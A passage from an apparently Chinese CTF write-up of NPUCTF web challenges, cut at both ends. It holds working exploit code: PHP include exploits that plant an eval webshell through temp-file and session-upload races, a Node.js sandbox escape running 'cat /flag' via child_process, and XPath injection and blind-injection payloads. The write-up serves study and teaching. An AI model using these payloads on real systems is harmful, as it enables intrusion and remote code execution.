r.text;</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>hashpumpy.hashpump()</code>四个参数的意思：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$hash1 = md5($secret.$salt1);</span><br><span class="line">$hash2 = md5($secret.$salt2);</span><br><span class="line"></span><br><span class="line">==&gt; hashpumpy.hashpump($hash1,$salt1,$salt2,i)    <span class="comment">// i代表$secret的长度</span></span><br></pre></td></tr></table></figure><p>最终跑出来secret长度为32，重定向到<code>flflflflag.php</code></p><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200423173553.png" style="zoom:80%;"><p>访问会重定向到404.html,抓包发现</p><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200423173914.png" style="zoom:80%;"><p>包含，伪协议读源吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php://filter/read=convert.base64-encode/resource=flflflflag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含flag无果，试着写临时文件</p><p>参考：<a href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p><p>利用<code>7.0.0 &lt;= PHP Version &lt; 7.0.28</code>的漏洞我们可以写出exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.ascii_letters</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line">    file_content = <span class="string">&quot;&lt;?php if(file_put_contents(&#x27;/tmp/moonback&#x27;, &#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;))&#123;echo &#x27;flag&#x27;;&#125;?&gt;&quot;</span></span><br><span class="line">    self_url = <span class="string">&quot;%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(times)):</span><br><span class="line">        print(<span class="string">&quot;[+] %d / %d&quot;</span> % (i, times))</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        upload_file_to_include(self_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_tmp_files()</span><br></pre></td></tr></table></figure><p>扫目录发现有<code>dir.php</code>，刚好把临时文件名字列出来了，其实不列也可以，只要把所有可能性跑完就可以了</p><p>然后包含会生成<code>/tmp/moonback</code>,再包含拿shell就行，最后bypass disable_function,flag在环境变量里</p><p>用<code>PHP_SESSION_UPLOAD_PROGRESS</code>也能上传，buu环境不行，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47.97.210.141:9666/flflflflag.php&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=dddd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                <span class="comment">#上传无效的空文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27;</span>     </span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">        <span class="comment"># print(&#x27;[+]POST&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t=r.get(url+<span class="string">&quot;?file=/tmp/sess_dddd&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            <span class="comment"># print(&#x27;[+]retry&#x27;)</span></span><br><span class="line">            print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">threading.Thread(target=POST,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h3><p>nodejs题目，源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>先看第一层</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p>keys不知道，要求first和second相等并且长度不等，还要加盐后的MD5值相等</p><p>key[0]是字符串，与字符串相加会强制类型转换，String和Array类型都有length属性，而且</p><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200426104856.png" style="zoom:80%;"><p>所以我们可以一个传数组，另外一个传字符串，但是直接urlencoded是无法传数组的，又发现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.json());</span><br></pre></td></tr></table></figure><p>所以我们可以传json数据，注意这里是用双引号（官方标准），尽管有时候单引号也可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;e&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="attr">&quot;first&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="attr">&quot;second&quot;</span>:[<span class="number">1</span>]&#125;</span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200426111206.png" style="zoom:67%;"><p>可以看到已经成功绕过，接着看下一步</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就是js原型链的内容了，看不懂了，贴下exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">encode = <span class="keyword">lambda</span> code: list(map(ord,code))</span><br><span class="line">decode = <span class="keyword">lambda</span> code: <span class="string">&quot;&quot;</span>.join(map(chr,code))</span><br><span class="line">a=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(m0=&gt;(</span></span><br><span class="line"><span class="string">        m0=m0.constructor,</span></span><br><span class="line"><span class="string">        m0.x=m0.constructor(</span></span><br><span class="line"><span class="string">            m0.fromCharCode(<span class="subst">&#123;encode(<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span>)&#125;</span>)</span></span><br><span class="line"><span class="string">        )()</span></span><br><span class="line"><span class="string">    ))(Math+1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a=re.sub(<span class="string">r&quot;[\s\[\]]&quot;</span>, <span class="string">&quot;&quot;</span>, a).replace(<span class="string">&quot;m0&quot;</span>,<span class="string">&quot;Math&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200426115237.png" style="zoom:67%;"><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><p>查看源码发现</p><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200426121209.png" style="zoom:80%;"><p>每次用不同session请求都会不同，抓包发现有防止csrf的token,请求不能重放</p><p>但是我们可以请求带上session获取到token,然后再POST</p><p>后面就是xpath注入的内容了，举个例子：</p><p>参考：<a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97">https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = simplexml_load_file(<span class="string">&#x27;users.xml&#x27;</span>);</span><br><span class="line">$name = $_GET[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$pwd = md5($_GET[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.$name.<span class="string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.$pwd.<span class="string">&quot;&#x27;]&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line">$result = $xml-&gt;xpath($query);</span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;ID:&#x27;</span>.$value-&gt;id;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;Username:&#x27;</span>.$value-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端上的<code>users.xml</code>是这样的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>0192023a7bbd73250516f069df18b500<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>jack<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>1d6c1e168e362bc0092f247399003a88<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>tony<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span> <span class="attr">type</span>=<span class="string">&quot;md5&quot;</span>&gt;</span>cc20f43c8c24dbc0b2539489b113277a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flag</span>&gt;</span>flag&#123;My_f1rst_xp4th_iNjecti0n&#125;<span class="tag">&lt;/<span class="name">flag</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xpath学习参考：<a href="https://www.runoob.com/xpath/xpath-tutorial.html">https://www.runoob.com/xpath/xpath-tutorial.html</a></p><h4 id="xpath注入常见函数"><a href="#xpath注入常见函数" class="headerlink" title="xpath注入常见函数"></a>xpath注入常见函数</h4><ul><li>codepoints-to-string(a, b, c, …)：将数字 a、b、c 转为对应的字符， Python 的<code>chr</code>函数类似。</li><li>string-to-codepoints(string)：与上面的相反</li><li>compare(a, b, rule)：比大小，func 是比较大小的规则</li><li>string-join((string, string, …), sep)：使用 sep 参数作为分隔符，来返回 string 参数拼接后的字符串。</li><li>substring(string, start [,len])：返回从 start 位置开始的指定长度的子字符串。第一个字符的下标是 1。如果省略 len 参数，则返回从位置 start 到字符串末尾的子字符串。</li><li>string-length([string])：返回指定字符串的长度。如果没有 string 参数，则返回当前节点的字符串值的长度。</li><li>count(item[, item1, …])：返回节点的数量。</li><li>position()：返回当前正在被处理的节点的 index 位置。</li><li>last()：返回在被处理的节点列表中的项目数目。</li><li>name([nodeset])：返回当前节点的名称或指定节点集中的第一个节点</li></ul><p>常见的注入分为两种，常规注入和布尔盲注，以上面的为例，先说下常规注入</p><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>上面那个我们就可以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.$name.<span class="string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.$pwd.<span class="string">&quot;&#x27;]&quot;</span>;</span><br><span class="line"><span class="comment">//需要知道一个用户名，构造</span></span><br><span class="line">?u=admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//此时执行的查询</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;admin&#x27; or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;</span><br></pre></td></tr></table></figure><p>假设我们不知道用户名，可以这样构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=<span class="string">&#x27; or 1 or &#x27;</span><span class="number">1</span>&amp;p=</span><br><span class="line"><span class="comment">//此时执行的查询</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&#x27; or 1 or &#x27;1&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;    </span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200426142520.png" style="zoom:67%;"><h4 id="节点遍历"><a href="#节点遍历" class="headerlink" title="节点遍历"></a>节点遍历</h4><p>构造类似下面，注意Xpath注入不像sql注入一样有注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u=admin<span class="string">&#x27;] | //* | //*[&#x27;</span>&amp;p=</span><br><span class="line"><span class="comment">//此时执行的查询</span></span><br><span class="line">$query = <span class="string">&quot;/root/users/user[username/text()=&#x27;&#x27;] | //* | //*[&#x27;&#x27; and password/text()=&#x27;&#x27;]&quot;</span>;</span><br><span class="line"><span class="comment">//&#x27;]闭合前边的 中间用|连接  //*代表选取文档中的所有元素  </span></span><br></pre></td></tr></table></figure><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200426150739.png" style="zoom:67%;"><p>这里的<code>|</code>不能用or代替</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>上面的方法无法爆出来flag，因为php之选择了id和password两个节点</p><p>我们可以用布尔盲注的方法爆出来flag</p><p><strong>判断节点数量：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=<span class="string">&#x27; or count(/)=1 or &#x27;</span><span 